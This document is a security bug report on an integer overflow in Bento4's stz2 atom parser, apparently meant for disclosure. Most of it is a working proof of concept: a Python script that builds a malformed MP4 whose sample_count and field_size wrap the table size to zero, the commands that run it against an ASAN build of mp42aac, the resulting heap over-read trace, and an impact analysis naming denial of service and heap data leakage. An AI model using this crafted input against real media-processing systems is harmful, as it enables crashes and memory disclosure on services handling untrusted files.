## Bug0: stz2 integer overflow in AP4_Stz2Atom constructor leads to heap buffer over-read

In `AP4_Stz2Atom::AP4_Stz2Atom` (`Ap4Stz2Atom.cpp`, lines 88–120), the expression `(sample_count * m_FieldSize + 7) / 8` computes `table_size` using 32-bit unsigned arithmetic without overflow checking, so when an attacker sets `sample_count=0x10000000` and `field_size=16` the product wraps to zero and a zero-byte buffer is allocated, then read out-of-bounds for every loop iteration.

### PoC

Craft a malicious MP4 file using the Python script below and process it with the ASAN-instrumented mp42aac binary to trigger the vulnerability.

```python
#!/usr/bin/env python3
import struct

def make_box(type_str, payload):
    size = 8 + len(payload)
    return struct.pack('>I', size) + type_str.encode('latin-1') + payload

def make_fullbox(type_str, version, flags, payload):
    hdr = struct.pack('>B', version) + struct.pack('>I', flags)[1:]
    return make_box(type_str, hdr + payload)

# stz2 atom: field_size=16, sample_count=0x10000000
# table_size = (0x10000000 * 16 + 7) / 8 = (0x100000000 + 7) / 8
#            → uint32_t wraps to 0, so table_size = 0
# buffer = new unsigned char[0]  (1-byte ASAN allocation)
# loop reads buffer[i*2] for 0x10000000 iterations → heap OOB READ
stz2_payload = (
    b'\x00\x00\x00'                    # reserved (3 bytes)
    + struct.pack('B', 16)             # field_size = 16
    + struct.pack('>I', 0x10000000)    # sample_count = 0x10000000
)
stz2 = make_fullbox('stz2', 0, 0, stz2_payload)

stbl = make_box('stbl', stz2)
minf = make_box('minf', stbl)
mdia = make_box('mdia', minf)
trak = make_box('trak', mdia)
moov = make_box('moov', trak)

ftyp = make_box('ftyp',
    b'mp42'
    + struct.pack('>I', 0)
    + b'mp42'
)

mp4_data = ftyp + moov
with open('poc_input.mp4', 'wb') as f:
    f.write(mp4_data)
print(f'[+] Written {len(mp4_data)} bytes to poc_input.mp4')
print('[+] sample_count=0x10000000, field_size=16 -> uint32_t overflow -> table_size=0')
```

```bash
python3 gen.py
ASAN_OPTIONS="abort_on_error=0:log_path=./asan.log" /data/ylwang/non-textfuzz/target/Bento4/build_test/bin/mp42aac poc_input.mp4 /dev/null || true
for f in ./asan.log.*; do grep -E "AddressSanitizer|ERROR:|runtime error:" "$f" || true; done
```

**Result:** ERROR: AddressSanitizer: heap-buffer-overflow on address 0x502000000091 at pc 0x55da9b537b62 bp 0x7ffcbd069a50 sp 0x7ffcbd069a40
READ of size 1 at 0x502000000091 thread T0
    #0 0x55da9b537b61 in AP4_Stz2Atom::AP4_Stz2Atom(unsigned int, unsigned char, unsigned int, AP4_ByteStream&) (mp42aac+0xc51b61)
    #1 0x55da9b5389fb in AP4_Stz2Atom::Create(unsigned int, AP4_ByteStream&) (mp42aac+0xc529fb)

### Impact

An attacker who supplies a crafted MP4 file with a malformed `stz2` box can trigger a heap buffer over-read in `AP4_Stz2Atom::AP4_Stz2Atom`, exposing adjacent heap contents including metadata from other allocations and potentially leaking sensitive runtime information. The out-of-bounds reads escalate in offset with each loop iteration up to 268 million times, causing an inevitable crash that constitutes a reliable denial of service against any mp42aac invocation on an untrusted MP4 file. In environments where heap layout is predictable, the corrupted `m_Entries` sample-size table propagated to subsequent `GetSampleSize()` calls may provide a primitive for further exploitation.
